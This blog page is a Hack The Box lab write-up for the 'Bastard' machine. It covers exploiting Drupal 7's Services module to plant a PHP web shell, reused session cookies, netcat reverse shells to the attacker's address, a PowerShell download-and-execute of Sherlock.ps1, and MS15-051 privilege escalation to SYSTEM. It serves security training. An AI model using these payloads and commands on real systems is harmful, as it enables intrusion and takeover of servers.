<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Bastard - DiegoExploit
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P385GSF');</script>
<!-- End Google Tag Manager -->
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>DiegoExploit</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>

<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>


</ul>
<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
</ul>




</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <br>
  <h1 id="Hack-The-Box-Bastard"><a href="#Hack-The-Box-Bastard" class="headerlink" title="Hack The Box - Bastard"></a>Hack The Box - Bastard</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Bastard for me was a difficult target, because I needed strong knowledge on PHP code. This machine demonstrate the potential severity of vulnerabilities in content management systems. Its IP address is <code>10.10.10.9.</code> Letâ€™s go to hack!!!<br><img src="/images/hackthebox/exploit/bastard/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
<p>As always we will start with <code>nmap</code> to scan for open ports and services:

<pre><figure class="highlight plain">|-------(root@kali)-------|(/home/kali)<br> |<br> |-->{SFire129}#nmap -A -v 10.10.10.9
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 17:48 EDT
 NSE: Loaded 151 scripts for scanning.
 Nmap scan report for 10.10.10.9
 Host is up (0.18s latency).
 Not shown: 997 filtered ports
 PORT      STATE SERVICE VERSION
 80/tcp    open  http    Microsoft IIS httpd 7.5
 |_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
 |_http-generator: Drupal 7 (http://drupal.org)
 | http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 | http-robots.txt: 36 disallowed entries (15 shown)
 | /includes/ /misc/ /modules/ /profiles/ /scripts/
 | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
 | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
 |_/LICENSE.txt /MAINTAINERS.txt
 |_http-server-header: Microsoft-IIS/7.5
 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9
 135/tcp   open  msrpc   Microsoft Windows RPC
 49154/tcp open  msrpc   Microsoft Windows RPC
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Device type: general purpose|phone|specialized
 Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
 OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
 No exact OS matches for host (test conditions non-ideal).
 Uptime guess: 0.001 days (since Fri May 15 17:48:20 2020)
 Network Distance: 2 hops
 TCP Sequence Prediction: Difficulty=263 (Good luck!)
 IP ID Sequence Generation: Incremental
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 TRACEROUTE (using port 135/tcp)
 HOP RTT       ADDRESS
 1   176.43 ms 10.10.14.1
 2   177.10 ms 10.10.10.9
 
 NSE: Script Post-scanning.
 Initiating NSE at 17:50
 Completed NSE at 17:50, 0.00s elapsed
 Initiating NSE at 17:50
 Completed NSE at 17:50, 0.00s elapsed
 Initiating NSE at 17:50
 Completed NSE at 17:50, 0.00s elapsed
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 86.57 seconds
            Raw packets sent: 2091 (95.688KB) | Rcvd: 39 (2.412KB)</figure></pre><br>

<p> The OS is Windows Server 2008 r2, the server has a 80/tcp port open with service http and CMS Drupal version 7.<br>
<p> The next step is look if the Drupal version has known vulnerabilities.

 <pre><figure class="highlight plain">|-------(root@kali)-------|(~/HacktTheBox)<br> |<br> -->{SFire129}#searchsploit Drupal 7 | grep "Remote Code Execution"
 Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                     | exploits/php/webapps/35150.php
 Drupal 7.x Module Services - Remote Code Execution                                                                           | exploits/php/webapps/41564.php
 Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                  | exploits/php/webapps/44542.txt
 Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                          | exploits/php/webapps/44449.rb
 Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                | exploits/php/remote/40144.php
 Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                            | exploits/php/remote/40130.rb
 |-------(root@kali)-------|(~/HacktTheBox)
 |
 |-->{SFire129}# <br></figure></pre>
<p> Download the 41564.php file or locate in the Kali linux and then modify the next section:<br>
<code>
$url = 'http://10.10.10.9';<br>
$endpoint_path = '/rest';<br>
$endpoint = 'rest_endpoint';<br>

$file = [<br>
    'filename' => 'writeup3.php',<br>
    'data' => '< ?php <br>
               echo (system($_GET["cmd"]));<br>
                ?>'<br>
];</code>
<img src="/images/hackthebox/exploit/bastard/1.png" alt=""></p>

 
<h2 id="Uploading Web Shell"><a href="#Uploading-Web-Shell" class="headerlink" title="Uploading Web Shell"></a>Uploading Web Shell</h2>
<p> The next step is to launch the PHP code against the web server.
<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox)<br> |<br> |-->{SFire129}#php 41564.php
 # Exploit Title: Drupal 7.x Services Module Remote Code Execution
 # Vendor Homepage: https://www.drupal.org/project/services
 # Exploit Author: Charles FOL
 # Contact: https://twitter.com/ambionics
 # Website: https://www.ambionics.io/blog/drupal-services-module-rce


 #!/usr/bin/php
 Stored session information in session.json
 Stored user information in user.json
 Cache contains 7 entries
 File written: http://10.10.10.9/writeup3.php
 |-------(root@kali)-------|(~/HacktTheBox)
 |
 |-->{SFire129}# <br></figure></pre>

<br>

<p> In the web browser look like that and then try to exectue some command.
<img src="/images/hackthebox/exploit/bastard/2.png" alt=""><br>
<img src="/images/hackthebox/exploit/bastard/3.png" alt="">


<p> Now, we can see some files in our Kali machine directory, <code> user.json and session.json</code>

<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox)<br> |<br> |-->{SFire129}#ls -la | grep .json
 -rw-r--r--  1 root root      187 May 15 18:17 session.json
 -rw-r--r--  1 root root      799 May 15 18:17 user.json
 |-------(root@kali)-------|(~/HackTheBox)
 |
 |-->{SFire129}#cat session.json
 {
     "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
     "session_id": "t2FftyyF5zXUNYuCoSq5xFMhflGGZZ_SrdRAhPZxO6I",
     "token": "Qmbi1nkkCohLZKZDl1mQOWk_xyFvrwC8JniT92oETSs"
 }|-------(root@kali)-------|(~/HackTheBox)
 |
 |-->{SFire129}# </figure></pre>
 
<p> Copy the <code> session_name and session_id </code> and paste into the some cookie manager addon on Firefox.

<br>

<img src="/images/hackthebox/exploit/bastard/4.png" alt=""><br>
<p>After to update the web page, show us the admin session started.

<img src="/images/hackthebox/exploit/bastard/5.png" alt="">

 
 <h2 id="Webshell-Execution"><a href="#Webshell-Execution" class="headerlink" title="Webshell Execution"></a> Webshell Execution</h2>
 
 <br>
 <p> With the command shell uploaded, get <code>nc.exe</code> of the shared folder from Kali linux with the <code>smbserver.py</code> program.
 <br>
 <p> From URL type execute command <code>http://10.10.10.9/writeup3.php?cmd=nc.exe 10.10.14.25 4444 -e cmd.exe</code>
 <br>
 <img src="/images/hackthebox/exploit/bastard/6.png" alt="">
 <br>
 <p> Now run nc for reverse shell, therefore will get a reverse shell with users privileges.
 
 <br>
  <img src="/images/hackthebox/exploit/bastard/7.png" alt="">
 <br>
 <p> Capture the flag user.
 <br>
 <pre><figure class="highlight plain">C:\Users>cd dimitris
C:\Users\dimitris>cd Desktop
C:\Users\dimitris\Desktop>type user.txt
type user.txt
***Here you could be found user flag***
C:\Users\dimitris\Desktop></figure></pre>
 
 
 <h2 id="Get-Privileges"><a href="#Get-Privilege" class="headerlink" title="Get Privilege"></a>Get Privileges</h2>
 <p> Run the command <code>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</code> to get OS version.
 <pre><figure class="highlight plain">C:\inetpub\drupal-7.54>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
  OS Version:                6.1.7600 N/A Build 7600
  C:\inetpub\drupal-7.54></figure></pre>
<br>
<p> Run the command <code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%</code> for OS Achitecture

<pre><figure class="highlight plain">C:\inetpub\drupal-7.54>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 OSArchitecture
 64-bit
 C:\inetpub\drupal-7.54></figure></pre>
<br>
<p> Run the command <code>wmic qfe</code> for extract PACTH and Updates.

<pre><figure class="highlight plain">C:\inetpub\drupal-7.54>wmic qfe
 wmic qfe
 No Instance(s) Available.
 C:\inetpub\drupal-7.54></figure></pre>
<br>
<p> The machine is a Windows server 2008 R2 Datacenter OS, is x64 Architecture and don't have Patch/Updates.
<br>
<p>Now, we need to view if the machine has some vulnerabilities, for this needs to execute script <a class="vglnk" href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" rel="nofollow"><span>Sherlock</span></a> and add this row<code>Find-AllVulns</code> to final script.
<br>
  <img src="/images/hackthebox/exploit/bastard/8.png" alt="">
  <br>
 <p>Now we need to get the Sherlock.ps1 from Kali, with simple http server.<br>
<p> From the reverse shell execute the next command for download from kali Sherlock.ps1

<br>
<p><code>echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.25:81/Sherlock.ps1") | powershell -noprofile - </code> 
 <img src="/images/hackthebox/exploit/bastard/9.png" alt="">
 <br>
 <p>The output look like this and find some vulnerability:
 <br>
  <pre><figure class="highlight plain">echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.25:81/Sherlock.ps1") | powershell -noprofile -
  
 Title      : User Mode to Ring (KiTrap0D)
 MSBulletin : MS10-015
 CVEID      : 2010-0232
 Link       : https://www.exploit-db.com/exploits/11199/
 VulnStatus : Not supported on 64-bit systems
 
 Title      : Task Scheduler .XML
 MSBulletin : MS10-092
 CVEID      : 2010-3338, 2010-3888
 Link       : https://www.exploit-db.com/exploits/19930/
 VulnStatus : Appears Vulnerable
 
 Title      : NTUserMessageCall Win32k Kernel Pool Overflow
 MSBulletin : MS13-053
 CVEID      : 2013-1300
 Link       : https://www.exploit-db.com/exploits/33213/
 VulnStatus : Not supported on 64-bit systems
 
 Title      : TrackPopupMenuEx Win32k NULL Page
 MSBulletin : MS13-081
 CVEID      : 2013-3881
 Link       : https://www.exploit-db.com/exploits/31576/
 VulnStatus : Not supported on 64-bit systems
 
 Title      : TrackPopupMenu Win32k Null Pointer Dereference
 MSBulletin : MS14-058
 CVEID      : 2014-4113
 Link       : https://www.exploit-db.com/exploits/35101/
 VulnStatus : Not Vulnerable
 
 Title      : ClientCopyImage Win32k
 MSBulletin : MS15-051
 CVEID      : 2015-1701, 2015-2433
 Link       : https://www.exploit-db.com/exploits/37367/
 VulnStatus : Appears Vulnerable
 
 Title      : Font Driver Buffer Overflow
 MSBulletin : MS15-078
 CVEID      : 2015-2426, 2015-2433
 Link       : https://www.exploit-db.com/exploits/38222/
 VulnStatus : Not Vulnerable
 
 Title      : 'mrxdav.sys' WebDAV
 MSBulletin : MS16-016
 CVEID      : 2016-0051
 Link       : https://www.exploit-db.com/exploits/40085/
 VulnStatus : Not supported on 64-bit systems
 
 Title      : Secondary Logon Handle
 MSBulletin : MS16-032
 CVEID      : 2016-0099
 Link       : https://www.exploit-db.com/exploits/39719/
 VulnStatus : Appears Vulnerable
 
 Title      : Windows Kernel-Mode Drivers EoP
 MSBulletin : MS16-034
 CVEID      : 2016-0093/94/95/96
 Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
              6-034?
 VulnStatus : Not Vulnerable
 
 Title      : Win32k Elevation of Privilege
 MSBulletin : MS16-135
 CVEID      : 2016-7255
 Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
              ample-Exploits/MS16-135
 VulnStatus : Not Vulnerable
 
 Title      : Nessus Agent 6.6.2 - 6.10.3
 MSBulletin : N/A
 CVEID      : 2017-7199
 Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
              tml
 VulnStatus : Not Vulnerable </figure></pre>
 
<p>The script show us that this machine has a vulnerability <code><a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>MS15-051</span></a></code> for OS x64. Download the script in Kali linux and run smbserver.py for to share script.
<br>
<p>1.)Run <code>smbserver.py</code> with <code><a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>MS15-051</span></a></code> inside.<br>
<p>2.)From reverse shell execute <code>copy \\10.10.14.25\FOLDER\ms15-051.exe ms15-051.exe</code>to get the .exe.<br>
<img src="/images/hackthebox/exploit/bastard/10.png" alt="">
<br>
<p>Run the command <code>ms51-015.exe whoami</code> for view the permisions.
<br>
 <pre><figure class="highlight plain">C:\inetpub\drupal-7.54>ms15-051.exe whoami
 ms15-051.exe whoami
 [#] ms15-051 fixed by zcgonvh
 [!] process with pid: 2776 created.
 ==============================
 nt authority\system

 C:\inetpub\drupal-7.54></figure></pre> 

   <h2 id="Capture the Flag"><a href="#Capture-the-Flag" class="headerlink" title="Capture the Flag"></a>Capture the Flag</h2>
  <p>1.)Launch in kali linux a nc on port 4445.
  <p>2.)Launch <code><a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>ms15-051.exe </span></a>"nc.exe 10.10.14.25 4445 -e cmd.exe"</code> for reverse shell with system privileges.
  <br>
  <img src="/images/hackthebox/exploit/bastard/11.png" alt="">
  <br>
  <p>Capture de root flag.
  <br>
    <pre><figure class="highlight plain">C:\inetpub\drupal-7.54>cd ..
 C:\inetpub>cd ..
 C:\>cd Users
 C:\Users>cd Administrator
 C:\Users\Administrator>cd Desktop
 C:\Users\Administrator\Desktop>type root.txt.txt
 type root.txt.txt
 ***Here you will be found the root flag***
 C:\Users\Administrator\Desktop>
   </figure></pre>
<p> And we owned root !</p>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.png" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>DiegoExploit</div>
      <div>2020-05-15</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
